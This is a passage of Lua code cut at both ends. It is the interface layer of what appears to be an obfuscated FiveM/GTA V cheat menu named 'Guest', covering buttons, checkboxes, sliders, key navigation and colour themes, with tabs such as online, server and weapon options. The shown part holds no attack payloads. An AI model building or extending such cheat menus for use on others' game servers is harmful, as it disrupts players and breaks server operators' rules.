                        I.GuestCurrentUI.keys.right
             then
                I.natives.e8ae1a79d1d9cbb6(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                dx ..
                    " button: " ..
                        d.Main.GuestToString(
                            I.GuestCurrentUI.currentMenu
                        ) ..
                            " menu doesn't exist"
        )
        return false
    end
end
function a952b5cc16ba63cf482ce(dz)
    local count = 0
    for cd in pairs(dz) do
        count = count + 1
    end
    return count
end
function ceb50bd5cac2e84(dA, dB)
    d.Main.GuestThread(
        function()
            Wait(dB)
            d.Main.GuestTable.GuestRemove(
                dA,
                1
            )
        end
    )
end
function I.checkboxButton(L, aD)
    local dx = L
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        I.GuestCurrentUI.optionCount =
            I.GuestCurrentUI.optionCount + 1
        local dy =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption == I.GuestCurrentUI.optionCount
        I.drawCheckbox(L, aD)
        if dy then
            if
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.select
             then
                I.natives.e8ae1a79d1d9cbb6(
                    -1,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.name,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.set,
                    true
                )
                I.c6b66f5c83c5739fa64558753033d13(dx .. " button pressed")
                return true
            elseif
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.left or
                    I.GuestCurrentUI.currentKey ==
                        I.GuestCurrentUI.keys.right
             then
                I.natives.e8ae1a79d1d9cbb6(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                dx ..
                    " button: " ..
                        d.Main.GuestToString(
                            I.GuestCurrentUI.currentMenu
                        ) ..
                            " menu doesn't exist"
        )
        return false
    end
end
function I.button2(L, dl, dm)
    local dx = L
    if dl then
        dx =
            "{ " ..
            d.Main.GuestToString(dx) ..
                ", " .. d.Main.GuestToString(dl) .. " }"
    end
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        I.GuestCurrentUI.optionCount =
            I.GuestCurrentUI.optionCount + 1
        local dy =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption == I.GuestCurrentUI.optionCount
        I.drawButton(true, L, dl, dm)
        if dy then
            if
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.select
             then
                I.natives.e8ae1a79d1d9cbb6(
                    -1,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.name,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.set,
                    true
                )
                I.c6b66f5c83c5739fa64558753033d13(dx .. " button pressed")
                return true
            elseif
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.left or
                    I.GuestCurrentUI.currentKey ==
                        I.GuestCurrentUI.keys.right
             then
                I.natives.e8ae1a79d1d9cbb6(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                dx ..
                    " button: " ..
                        d.Main.GuestToString(
                            I.GuestCurrentUI.currentMenu
                        ) ..
                            " menu doesn't exist"
        )
        return false
    end
end
function I.menuButton(L, aW, dl, dm)
    if I.GuestCurrentUI.GuestShit[aW] then
        if I.button2(L, dl, dm) then
            I.e1f7840a0e42a66ce28aaf37700(I.GuestCurrentUI.currentMenu, false)
            I.e1f7840a0e42a66ce28aaf37700(aW, true, true)
            return true
        end
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                d.Main.GuestToString(L) ..
                    " menu button: " ..
                        d.Main.GuestToString(aW) ..
                            " submenu doesn't exist"
        )
    end
    return false
end
function I.checkBox(L, dC, aP)
    if I.checkboxButton(L, dC) then
        dC = not dC
        I.c6b66f5c83c5739fa64558753033d13(
            d.Main.GuestToString(L) ..
                " checkbox changed to " .. d.Main.GuestToString(dC)
        )
        if aP then
            aP(dC)
        end
        return true
    end
    return false
end
function I.ValueChanger(L, dD, dE, dF, aP, dG)
    lowestvalue, highestvalue =
        d.Main.GuestTable.GuestUnPack(
        dF
    )
    if dD == nil then
        dD = 0
    end
    local menu =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ]
    if menu then
        I.GuestCurrentUI.optionCount =
            I.GuestCurrentUI.optionCount + 1
        local retval = I.DrawChanger(L, d.Main.GuestToString(dD))
        if menu.currentOption == I.GuestCurrentUI.optionCount then
            if dG then
                if IsDisabledControlPressed(0, 189) then
                    if dD > lowestvalue then
                        aP(dD - dE)
                    end
                end
                if IsDisabledControlPressed(0, 190) then
                    if dD < highestvalue then
                        aP(dD + dE)
                    end
                end
            else
                if IsDisabledControlJustPressed(0, 189) then
                    if dD > lowestvalue then
                        aP(dD - dE)
                    end
                end
                if IsDisabledControlJustPressed(0, 190) then
                    if dD < highestvalue then
                        aP(dD + dE)
                    end
                end
            end
        end
        if retval then
            return true
        end
    end
    return false
end
function I.comboBox(L, dH, dI, dJ, aP)
    local dK = #dH
    local dL = dH[dI]
    local dy =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ].currentOption ==
        I.GuestCurrentUI.optionCount + 1
    if dK > 1 and dy then
        dL = "« " .. d.Main.GuestToString(dL) .. " »"
    end
    if I.button(L, dL) then
        dJ = dI
        aP(dI, dJ)
        return true
    elseif dy then
        if
            I.GuestCurrentUI.currentKey ==
                I.GuestCurrentUI.keys.left
         then
            if dI > 1 then
                dI = dI - 1
            else
                dI = dK
            end
        elseif
            I.GuestCurrentUI.currentKey ==
                I.GuestCurrentUI.keys.right
         then
            if dI < dK then
                dI = dI + 1
            else
                dI = 1
            end
        end
    else
        dI = dJ
    end
    aP(dI, dJ)
    return false
end
function I.comboBoxSlider(L, dH, dI, dJ, aP)
    local dK = #dH
    local dL = dH[dI]
    local dy =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ].currentOption ==
        I.GuestCurrentUI.optionCount + 1
    if dK > 1 and dy then
        dL = d.Main.GuestToString(dL)
    end
    if I.button3(L, dH, dK, dI) then
        dJ = dI
        aP(dI, dJ)
        return true
    elseif dy then
        if
            I.GuestCurrentUI.currentKey ==
                I.GuestCurrentUI.keys.left
         then
            if dI > 1 then
                dI = dI - 1
            elseif dI == 1 then
                dI = 1
            end
        elseif
            I.GuestCurrentUI.currentKey ==
                I.GuestCurrentUI.keys.right
         then
            if dI < dK then
                dI = dI + 1
            elseif dI == dK then
                dI = dK
            end
        end
    else
        dI = dJ
    end
    aP(dI, dJ)
    return false
end
function I.drawButton3(L, dH, dK, dI)
    local x =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ].x +
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].width /
            2
    local dn = nil
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption <=
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount
     then
        dn = I.GuestCurrentUI.optionCount
    elseif
        I.GuestCurrentUI.optionCount >
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].currentOption
     then
        dn =
            I.GuestCurrentUI.optionCount -
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount)
    end
    if dn then
        local y =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].y +
            I.GuestCurrentUI.titleHeight +
            I.GuestCurrentUI.buttonHeight +
            I.GuestCurrentUI.buttonHeight * dn -
            I.GuestCurrentUI.buttonHeight / 2
        local dp = nil
        local dq = nil
        local dr = nil
        local dM = nil
        local dN = nil
        local cH = false
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount
         then
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusTextColor
            dr =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusTextColor
            dM = {r = I.mainColor.r, g = I.mainColor.g, b = I.mainColor.b, a = 255}
            dN = {r = I.mainColor.r, g = I.mainColor.g, b = I.mainColor.b, a = 255}
        else
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuTextColor
            dr =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuSubTextColor
            dM =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuTextColor
            dN = {r = 155, g = 155, b = 155, a = 150}
            cH = true
        end
        local dO =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].width /
            3 /
            dK
        local dP = (dO * (dI + 1) - dO * dI) / 2
        local dQ = 0.16
        local dR = 1
        if dK >= 40 then
            dR = 1.005
        end
        I.DrawRect(
            x,
            y,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width,
            I.GuestCurrentUI.buttonHeight,
            dp
        )
        I.DrawRect(
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x +
                0.1675 +
                dP * dK) /
                dR,
            y,
            dO * (dK - 1) + 0.001,
            I.GuestCurrentUI.buttonHeight / 2 + 0.002,
            dN
        )
        I.DrawRect(
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x +
                0.1675 +
                dP * dK) /
                dR,
            y,
            dO * (dK - 1),
            I.GuestCurrentUI.buttonHeight / 2,
            {r = 10, g = 10, b = 10, a = 150}
        )
        I.DrawRect(
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x +
                0.1675 +
                dP * dI) /
                dR,
            y,
            dO * (dI - 1),
            I.GuestCurrentUI.buttonHeight / 2,
            dM
        )
        I.drawText(
            L,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x + I.GuestCurrentUI.buttonTextXOffset,
            y - I.GuestCurrentUI.buttonHeight / 2 +
                I.GuestCurrentUI.buttonTextYOffset,
            I.GuestCurrentUI.buttonFont,
            dq,
            I.GuestCurrentUI.buttonScale,
            false,
            cH
        )
        local dS = d.Main.GuestToString(dH[dI])
        if string.len(dS) == 1 then
            dQ = 0.1650
        elseif string.len(dS) == 2 then
            dQ = 0.1625
        elseif string.len(dS) == 3 then
            dQ = 0.16015
        elseif string.len(dS) == 4 then
            dQ = 0.1585
        elseif string.len(dS) == 5 then
            dQ = 0.1570
        elseif string.len(dS) >= 6 then
            dQ = 0.1555
        end
        I.drawText(
            dH[dI],
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x +
                dQ +
                0.04) /
                dR,
            y - I.GuestCurrentUI.buttonHeight / 2.15 +
                I.GuestCurrentUI.buttonTextYOffset,
            I.GuestCurrentUI.buttonFont,
            {r = 255, g = 255, b = 255, a = 255},
            I.GuestCurrentUI.buttonScale,
            false,
            cH
        )
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount and
                I.GuestCurrentUI.menu_RectOverlay
         then
            if not HasStreamedTextureDictLoaded("deadline") then
                I.natives.RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                x,
                y,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].width,
                I.GuestCurrentUI.buttonHeight,
                0.0,
                I.mainColor.r,
                I.mainColor.g,
                I.mainColor.b,
                55
            )
        end
    end
end
function I.button3(L, dH, dK, dI)
    local dx = L
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        I.GuestCurrentUI.optionCount =
            I.GuestCurrentUI.optionCount + 1
        local dy =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption == I.GuestCurrentUI.optionCount
        I.drawButton3(L, dH, dK, dI)
        if dy then
            if
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.select
             then
                I.natives.e8ae1a79d1d9cbb6(
                    -1,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.name,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.set,
                    true
                )
                I.c6b66f5c83c5739fa64558753033d13(dx .. " button pressed")
                return true
            elseif
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.left or
                    I.GuestCurrentUI.currentKey ==
                        I.GuestCurrentUI.keys.right
             then
                I.natives.e8ae1a79d1d9cbb6(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                dx ..
                    " button: " ..
                        d.Main.GuestToString(
                            I.GuestCurrentUI.currentMenu
                        ) ..
                            " menu doesn't exist"
        )
        return false
    end
end
function I.d81c77ca5806c108e0dad172ac845()
    if I.isMenuVisible(I.GuestCurrentUI.currentMenu) then
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].aboutToBeClosed
         then
            I.ba324546()
        else
            I.ef538a86f538097()
            I.b56c29383a6b8f4877()
            I.GuestCurrentUI.currentKey = nil
            if IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.down) then
                I.natives.e8ae1a79d1d9cbb6(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].currentOption < I.GuestCurrentUI.optionCount
                 then
                    I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].currentOption =
                        I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].currentOption + 1
                else
                    I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].currentOption = 1
                end
            elseif IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.up) then
                I.natives.e8ae1a79d1d9cbb6(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].currentOption > 1
                 then
                    I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].currentOption =
                        I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].currentOption - 1
                else
                    I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].currentOption = I.GuestCurrentUI.optionCount
                end
            elseif IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.left) then
                I.GuestCurrentUI.currentKey =
                    I.GuestCurrentUI.keys.left
            elseif IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.right) then
                I.GuestCurrentUI.currentKey =
                    I.GuestCurrentUI.keys.right
            elseif IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.select) then
                I.GuestCurrentUI.currentKey =
                    I.GuestCurrentUI.keys.select
            elseif IsDisabledControlJustReleased(1, I.GuestCurrentUI.keys.back) then
                if
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].previousMenu
                    ]
                 then
                    I.natives.e8ae1a79d1d9cbb6(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    I.e1f7840a0e42a66ce28aaf37700(
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].previousMenu,
                        true
                    )
                else
                    I.ba324546()
                end
            end
            I.GuestCurrentUI.optionCount = 0
        end
    end
end
function I.setMenuWidth(aW, width)
    I.setMenuProperty(aW, "width", width)
end
function I.setMenuX(aW, x)
    I.setMenuProperty(aW, "x", x)
end
function I.setMenuY(aW, y)
    I.setMenuProperty(aW, "y", y)
end
function I.setMenuMaxOptionCountOnScreen(aW, count)
    I.setMenuProperty(aW, "maxOptionCount", count)
end
function I.setTitle(aW, dt)
    I.setMenuProperty(aW, "title", dt)
end
function I.setTitleColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "titleColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].titleColor.a
        }
    )
end
function I.setTitleBackgroundColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "titleBackgroundColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].titleBackgroundColor.a
        }
    )
end
function I.setTitleBackgroundSprite(aW, az, dT)
    I.natives.RequestStreamedTextureDict(az)
    I.setMenuProperty(aW, "titleBackgroundSprite", {dict = az, name = dT})
end
function I.setTitleBackgroundSpriteNil(aW)
    I.setMenuProperty(aW, "titleBackgroundSprite", nil)
end
function I.SubSettingTitle(aW, L)
    I.setMenuProperty(aW, "subTitle", L)
end
function I.setMenuBackgroundColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuBackgroundColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuBackgroundColor.a
        }
    )
end
function I.setMenuSubTitleBackgroundColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "subTitleBackgroundColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].subTitleBackgroundColor.a
        }
    )
end
function I.setMenuTextColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuTextColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuTextColor.a
        }
    )
end
function I.setMenuSubTextColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuSubTextColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuSubTextColor.a
        }
    )
end
function I.setMenuFocusTextColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuFocusTextColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuFocusTextColor.a
        }
    )
end
function I.setMenuFocusColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuFocusColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuFocusColor.a
        }
    )
end
function I.setMenuButtonPressedSound(aW, aQ, dU)
    I.setMenuProperty(aW, "buttonPressedSound", {["name"] = aQ, ["set"] = dU})
end
function I.setFont(aW, J)
    I.GuestCurrentUI.buttonFont = J
    I.GuestCurrentUI.GuestShit[aW].titleFont = J
end
local dV = ds
function I.setMaxOptionCount(aW, count)
    I.setMenuProperty(aW, "maxOptionCount", count)
end
function I.setMenuFocusBackgroundColor(aW, r, g, b, a)
    I.setMenuProperty(
        aW,
        "menuFocusBackgroundColor",
        {
            ["r"] = r,
            ["g"] = g,
            ["b"] = b,
            ["a"] = a or
                I.GuestCurrentUI.GuestShit[aW].menuFocusBackgroundColor.a
        }
    )
end
d.Main.GuestThread(
    function()
        while I.shouldShowMenu do
            d.Main.GuestWait(0)
            I.GuestCurrentUI.rainbowValue = I.NewFunction.sfvjdsqiofgjqdsofhqsziuhfhz(0.2)
            if I.GuestCurrentUI.selectedUIRainbow then
                I.mainColor = {
                    r = I.GuestCurrentUI.rainbowValue.r,
                    g = I.GuestCurrentUI.rainbowValue.g,
                    b = I.GuestCurrentUI.rainbowValue.b,
                    a = 255
                }
            end
        end
    end
)
function I.setTheme(aW)
    if I.GuestCurrentUI.selectedUI == "Lite" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest9", "HeaderLite")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 43, 145, 216, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 43, 145, 216, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Blue" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest", "GuestHeader")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 0, 220, 0, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 0, 220, 0, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Original" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest7", "GuestHeader7")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 87, 46, 192, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 82, 46, 190, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Blue" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest", "GuestHeader")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 0, 220, 0, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 0, 220, 0, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Purple" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest5", "GuestHeader5")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 87, 46, 192, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 255, 255, 255, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
